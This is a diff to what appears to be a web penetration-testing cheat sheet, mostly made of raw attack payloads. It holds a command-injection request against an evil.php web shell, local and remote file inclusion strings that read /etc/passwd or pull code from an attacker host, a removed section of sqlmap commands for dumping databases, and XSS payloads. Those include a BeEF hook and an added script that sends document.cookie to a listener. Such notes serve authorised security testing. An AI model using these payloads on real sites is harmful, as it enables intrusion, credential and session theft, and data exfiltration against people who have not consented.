@@ -88,6 +88,12 @@ wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|b
 cat output
 ------------------------------------------------------------------------------------------------------
 
+# Fuzzing
+
+When fuzzing headers, disable URL Encode.
+When you are inside of a POST parameter, always use URL encoding.
+------------------------------------------------------------------------------------------------------
+
 # Local file inclusion
 
 http://localhost/index.php?page=/etc/passwd
@@ -107,18 +113,6 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 http://localhost/index.php?page=http://attackersHost/evil.txt
 ------------------------------------------------------------------------------------------------------
-
-# SQLi
-
-Use Burp to trap a request. Copy the request to /root/request.txt.
-
-./sqlmap -r /root/request.txt
-./sqlmap -r /root/request.txt -p <parameter to test> --current-user
-./sqlmap -r /root/request.txt -D <database> --tables              Show all tables in database
-./sqlmap -r /root/request.txt -D <database> -T <table> --dump     Show all data in table
-------------------------------------------------------------------------------------------------------
-
-
 
 # TRACE / TRACK methods allowed
 
@@ -142,23 +136,24 @@ for i in $(cat 80.txt); do cadaver -t $i; done
 wpscan.rb - -url www.target.com - -enumerate p
 ------------------------------------------------------------------------------------------------------
 
+# XML Injection
+
+Single quote		foo'
+Double quote		foo”
+Greater than		foo>
+Less than		foo<			
+Comment tag		foo<!--
+Ampersand		&foo
+------------------------------------------------------------------------------------------------------
+
 # XSS
 
-http://target.com/index.php?user=<script>alert(123)</script>
-http://target.com/index.php?user=<script>Test_XSS</script>
-curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
-
-<script>("Test_XSS")</script>
-
-<script>alert(1)</script>        Or try inserting a NULL byte:  %00<script>alert(1)</script> 
-
-http://target.com/index.php?user=<script>alert(123)</script>
-<script>('Test XSS')</script>
+http://target.com/index.php?user=<script>alert(1)</script>
+http://target.com/index.php?user=<script>alert("Test XSS")alert</script>
 
 curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
-This locator in particular is good. '';!--"<XSS>=&{()}
-I would probably change it. '';!--"<a2S>=&{()}
 
-<iframe height=”0″ width=”0″src=<BeEF_hook></iframe>
+<iframe height=”0″ width=”0″ src=<BeEF_hook></iframe>
 
-
+<script>alert(document.cookie)</script>
+<script>var img = new Image(); img.src=“http://127.0.0.1:8000/?cookie=“+document.cookie;</script>
